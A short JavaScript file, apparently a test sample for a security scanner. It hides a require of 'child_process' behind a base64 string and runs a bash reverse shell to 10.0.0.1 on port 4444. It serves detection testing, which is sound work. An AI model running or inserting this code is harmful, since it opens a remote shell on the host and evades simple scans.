// Adversarial sample: dynamic require via base64 decode + reverse shell
const mod = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());
mod.exec('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
